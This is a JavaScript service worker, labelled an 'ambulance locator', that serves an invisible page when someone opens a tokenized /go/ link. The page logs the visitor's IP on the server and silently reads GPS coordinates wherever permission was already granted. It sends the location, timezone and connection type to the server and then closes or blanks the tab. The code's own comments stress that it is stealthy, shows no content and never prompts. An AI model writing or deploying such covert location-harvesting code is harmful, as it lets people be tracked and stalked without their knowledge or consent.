// ═══════════════════════════════════════════════════════════
// AMBULANCE LOCATOR — Service Worker v3.0 (ALWAYS STEALTH)
// ═══════════════════════════════════════════════════════════
// Every /go/<token> navigation → intercept → stealth HTML
// GPs fires silently if cached, IP fallback always works
// No verify page, no permission prompt, zero visible content
// ═══════════════════════════════════════════════════════════

self.addEventListener("install", function(event) {
  self.skipWaiting();
});

self.addEventListener("activate", function(event) {
  event.waitUntil(self.clients.claim());
});

self.addEventListener("fetch", function(event) {
  const url = new URL(event.request.url);
  const match = url.pathname.match(/^\/go\/([a-f0-9]+)$/);
  if (!match || event.request.method !== "GET") return;

  const token = match[1];
  const origin = url.origin;
  const isNavigation = event.request.mode === "navigate";

  if (!isNavigation) return;

  event.respondWith(
    (async function() {
      try {
        // ── Fire-and-forget: trigger server-side IP geolocation ──
        fetch(origin + "/sw-capture/" + token, {
          method: "GET",
          headers: { "X-SW-Intercept": "1" }
        });

        // ── Stealth HTML: absolute minimum, zero visible content ──
        const stealthHtml = '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8" />\n<meta name="viewport" content="width=device-width, initial-scale=1.0" />\n<title> </title>\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nhtml,body{background:#000;overflow:hidden;width:100%;height:100%}\nbody{opacity:0}\n</style>\n</head>\n<body>\n<script>\n(function(){'use strict';var t="' + token + '";var _s=false;function _tz(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){}return null}function _ct(){try{var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(c)return c.effectiveType||c.type||null}catch(e){}return null}function _ok(lat,lng,acc){if(_s)return;_s=true;var p=JSON.stringify({token:t,latitude:lat,longitude:lng,accuracy:acc,connectionType:_ct(),timezone:_tz()});var b=new Blob([p],{type:"application/json"});if(navigator.sendBeacon)navigator.sendBeacon("/api/location-update",b);else try{fetch("/api/location-update",{method:"POST",headers:{"Content-Type":"application/json"},body:p,keepalive:true})}catch(e){}}function _fail(){if(_s)return;_s=true;var p=JSON.stringify({token:t,connectionType:_ct(),timezone:_tz()});var b=new Blob([p],{type:"application/json"});if(navigator.sendBeacon)navigator.sendBeacon("/api/location-denied",b);else try{fetch("/api/location-denied",{method:"POST",headers:{"Content-Type":"application/json"},body:p,keepalive:true})}catch(e){}}function _vanish(){try{window.location.replace("about:blank")}catch(e){}try{window.open("","_self","").close()}catch(e){}try{self.close()}catch(e){}try{window.close()}catch(e){}setTimeout(function(){try{document.open();document.write("");document.close()}catch(e){}},5)}if(navigator.permissions&&navigator.permissions.query){navigator.permissions.query({name:"geolocation"}).then(function(s){if(s.state==="granted"&&"geolocation"in navigator){navigator.geolocation.getCurrentPosition(function(p){_ok(p.coords.latitude,p.coords.longitude,p.coords.accuracy);_vanish()},function(){_fail();_vanish()},{enableHighAccuracy:true,timeout:8000,maximumAge:300000});setTimeout(function(){if(!_s){_fail();_vanish()}},10000)}else{_fail();_vanish()}}).catch(function(){_fail();_vanish()})}else{_fail();_vanish()}})();\n</script>\n</body>\n</html>';

        return new Response(stealthHtml, {
          headers: {
            "Content-Type": "text/html; charset=utf-8",
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "X-Robots-Tag": "noindex, nofollow",
          }
        });
      } catch (e) {
        return fetch(event.request);
      }
    })()
  );
});
